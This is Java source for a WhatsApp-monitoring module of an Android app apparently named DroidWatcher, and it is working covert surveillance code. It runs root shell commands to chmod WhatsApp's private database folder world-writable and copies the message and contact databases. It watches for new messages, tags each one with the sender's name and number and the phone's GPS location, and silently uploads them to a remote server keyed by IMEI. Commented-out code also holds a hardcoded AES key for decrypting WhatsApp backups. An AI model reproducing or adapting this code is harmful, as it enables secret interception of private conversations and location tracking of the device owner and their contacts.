package com.droidwatcher.modules;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.ServerMessanger;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.IMessageBody;
import com.droidwatcher.lib.MessageType;
import com.droidwatcher.lib.IMMessage;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.services.AppService;
import com.droidwatcher.variables.ServerMessage;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.execution.CommandCapture;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.FileObserver;
import android.preference.PreferenceManager;

@SuppressLint("SdCardPath")
public class WhatsAppModule implements OnSharedPreferenceChangeListener {
//	private static final String CHIPER_TRANSFORMATION = "AES/ECB/PKCS5Padding";
//	private static final String ALGORITHM = "AES";
//	private static final byte[] KEY = new byte[]{ 52, 106, 35, 101, 42, 70, 57, 43, 77, 115, 37, 124, 103, 49, 126, 53, 46, 51, 114, 72, 33, 119, 101, 44 };
	
//	private static final String W_CLEAR_DB = "/data/data/com.whatsapp/databases/msgstore.db";
//	private static String m_whatsappClearDBName = "/data/data/com.whatsapp/databases/msgstore.db";
//    private static String m_whatsappCryptedDBName = "msgstore.db.crypt";
//    private static String m_whatsappDBName = "whatsapp.db";
//    private static String m_whatsappDataName = "/data/data/com.whatsapp/databases/";
	
//	private byte[] decryptDB(byte[] encryptedDB) throws Exception {		
//	Cipher ciper = Cipher.getInstance(CHIPER_TRANSFORMATION);
//	SecretKeySpec key = new SecretKeySpec(KEY, ALGORITHM);//TODO: test key
//	ciper.init(Cipher.DECRYPT_MODE, key);
//	byte[] result = ciper.doFinal(encryptedDB);
//	return result;
//}
	
	/** WhatsApp messages db path */
	private static final String PATH_MESSAGES = "/data/data/com.whatsapp/databases/msgstore.db";
	/** WhatsApp contacts db path */
	private static final String PATH_WA = "/data/data/com.whatsapp/databases/wa.db";
	private static final String[] MESSAGES_COLUMNS = new String[] {"key_remote_jid", "key_from_me", "data", "timestamp"};
	private static final String[] WA_COLUMNS = new String[] { "display_name", "number" };
	private static final String SETTINGS_LASTDATE = "lastdate_w";
	
	private String LOCAL_PATH_MESSAGES = "";
	private String LOCAL_PATH_WA = "";
	
	private Context mContext;
	private SettingsManager mSettings;
	private long mLastMsgTimestamp;
	private FileObserver mObserver;
	private HashMap<String, String> mUsernames;
	private boolean mIsStarted;

	public WhatsAppModule(Context context){
		this.mContext = context;
		this.mSettings = new SettingsManager(context);
		this.mUsernames = new HashMap<String, String>();
		this.mIsStarted = false;
		
		LOCAL_PATH_MESSAGES = FileUtil.getFullPath(context, "msgstore_w.db");
		LOCAL_PATH_WA = FileUtil.getFullPath(context, "wa_w.db");
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("WA_ENABLED")){
			if (mSettings.isWhatsAppEnabled()) {
				if (!mIsStarted) {
					start();
				}
			}
			else{
				if (mIsStarted) {
					stop();
				}
			}
		}
	}
	
	public synchronized void start(){
		if (!mSettings.isWhatsAppEnabled()) {
			return;
		}
		
		if (!isWhatsAppAvailable()) {
			return;
		}
		
		if (!AppService.isRootAvailable()) {
			return;
		}
		
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.whatsapp/databases/*",
				"chmod 777 /data/data/com.whatsapp/databases",
				"chmod 777 " + FileUtil.getFullPath(mContext, "*"));
			
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				FileUtil.copyFile(PATH_MESSAGES, LOCAL_PATH_MESSAGES);
				FileUtil.copyFile(PATH_WA, LOCAL_PATH_WA);
				
				SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
				mLastMsgTimestamp = settings.getLong(SETTINGS_LASTDATE, getLastMsgTimestamp());
				mObserver = new WhatsAppFileObserver();
				
				Debug.i("[WhatsAppModule] Start watching");
				mObserver.startWatching();
				
				mIsStarted = true;
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void stop() {
		mIsStarted = false;
		
		try {
			saveLastMsgTimestamp(mLastMsgTimestamp);
			if (mObserver != null) {
				mObserver.stopWatching();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			mObserver = null;
		}
	}
	
	public void dispose(){
		stop();
	}
	
	protected synchronized void getNewChat(){
		MyCommandCapture command = new MyCommandCapture(
				"chmod 777 /data/data/com.vkontakte.android/databases/*",
				"chmod 777 /data/data/com.vkontakte.android/databases");
		
		command.setCallback(new ICommandCallback() {
			@Override
			public void run() {
				_getNewChat();
			}
		});
		
		try {
			RootTools.getShell(true).add(command);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
	}
	
	private synchronized void _getNewChat(){
		if (!FileUtil.copyFile(PATH_MESSAGES, LOCAL_PATH_MESSAGES)) {
			return;
		}
		
		SQLiteDatabase db = null;
		
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			ArrayList<IMessageBody> list = getMessages(db);
			
			if (list == null) {
				return;
			}
			
			final long lastMsgTimestamp = mLastMsgTimestamp;
			mLastMsgTimestamp = getLastMsgTimestamp(db);
			
			db.close();
			db = null;
			
			if (list != null && list.size() > 0 && networkAvailable()) {
				new ServerMessanger(
					mContext,
					new ServerMessage(MessageType.WA, mSettings.imei(), mSettings.login(), list),
					new ServerMessanger.ICallBack() {
						@Override
						public boolean onFinished(String response) { return false; }

						@Override
						public void onError() {
							mLastMsgTimestamp = lastMsgTimestamp;
						}

						@Override
						public void onSuccess() {
							saveLastMsgTimestamp(mLastMsgTimestamp);
						}
					}
				).start();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
		}
	}
	
	private ArrayList<IMessageBody> getMessages(SQLiteDatabase db){
		Cursor c = null;
		try {
			ArrayList<IMessageBody> messages = new ArrayList<IMessageBody>();
			IMMessage message;
			long timeout = new Date().getTime() - LocationModule.LOCATION_TIMEOUT;
			c = db.query("messages", MESSAGES_COLUMNS, "timestamp > " + mLastMsgTimestamp, null, null, null, null);
			while (c.moveToNext()) {
				String jid = c.getString(0);
				int type = c.getInt(1) + 1; /* c.getInt(1) == 1 - is out;*/
				String text = c.getString(2);
				long date = c.getLong(3); /* time */
				
				message = new IMMessage(date, text, getUserName(jid), type);
				
				if (date >= timeout) {
					Location location = LocationModule.getLocation(mContext);
					if (location != null) {
						message.addLocation(location.getLatitude(), location.getLongitude());
					}
				}
				
				messages.add(message);
			}
			
			return messages;
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return null;
			
		} finally {
			if (c != null) {
				c.close();
			}
		}
	}
	
	private synchronized String getUserName(String jid){
		if (mUsernames.containsKey(jid)) {
			return mUsernames.get(jid);
		}
		
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_WA, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.query("wa_contacts",  WA_COLUMNS, "jid = ?", new String[] { jid }, null, null, null);
			if (c.getCount() != 1) {
				return "Unknown";
			}
			
			if (c.moveToFirst()) {
				String username = c.getString(0) + " (" + c.getString(1) + ")";
				mUsernames.put(jid, username);
				return username;
			}
			
			return "Unknown";
			
		} catch(Exception e){
			e.printStackTrace();
			return "Unknown";
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastMsgTimestamp(){
		SQLiteDatabase db = null;
		Cursor c = null;
		try {
			db = SQLiteDatabase.openDatabase(LOCAL_PATH_MESSAGES, null, SQLiteDatabase.NO_LOCALIZED_COLLATORS | SQLiteDatabase.OPEN_READONLY);
			c = db.rawQuery("SELECT MAX(timestamp) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {
			if (db != null && db.isOpen()) {
				db.close();
			}
			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private long getLastMsgTimestamp(SQLiteDatabase db){
		Cursor c = null;
		try {
			c = db.rawQuery("SELECT MAX(timestamp) FROM messages", null);
			c.moveToFirst();
			return c.getLong(0);
			
		} catch(Exception e){
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
			return new Date().getTime();
			
		} finally {			
			if (c != null) {
				c.close();
			}
		}
	}
	
	private Boolean isWhatsAppAvailable(){
		try {
			mContext.getPackageManager().getPackageInfo("com.whatsapp", PackageManager.GET_ACTIVITIES);
			return true;
			
		} catch (NameNotFoundException e) {
			return false;
		}
	}
	
	private synchronized void saveLastMsgTimestamp(long lastMsgTimestamp){
		if (lastMsgTimestamp == 0) {
			return;
		}
		
		SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(mContext);
		Editor editor = settings.edit();
		editor.putLong(SETTINGS_LASTDATE, lastMsgTimestamp);
		editor.commit();
	}
	
	private Boolean networkAvailable(){
		ConnectivityManager manager = (ConnectivityManager)mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = manager.getActiveNetworkInfo();
		
		if (info == null){
			return false;
		}
		
		if (mSettings.onlyWiFi() && info.getType() != ConnectivityManager.TYPE_WIFI){
			return false;
		}
		
		return info.isConnectedOrConnecting();
	}

	private class MyCommandCapture extends CommandCapture{
		private ICommandCallback callback;
		
		public MyCommandCapture(String... command){
			super(0, command);
		}
		
		public void setCallback(ICommandCallback callback){
			this.callback = callback;
		}
		
		@Override
		public void commandCompleted(int id, int exitcode) {
			if (callback != null) {
				callback.run();
			}
		}
	}
	
	private interface ICommandCallback{
		public void run();
	}
	
	private class WhatsAppFileObserver extends FileObserver {
		private static final long UPDATE_TIOMEOUT = 2 * 1000L;
		
		private long lastUpdate;

		public WhatsAppFileObserver() {
			super(PATH_MESSAGES, FileObserver.MODIFY);
		}

		@Override
		public synchronized void onEvent(int event, String path) {
			Debug.i("onEvent: " + event + "; Path: " + path);
			
			long now = Calendar.getInstance().getTimeInMillis();
			if (now - lastUpdate < UPDATE_TIOMEOUT) {
				return;
			}

			lastUpdate = now;

			new Thread(new Runnable() {
				@Override
				public void run() {
					try {
						Thread.sleep(UPDATE_TIOMEOUT);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}

					getNewChat();
				}
			}).start();

		}
	}
}
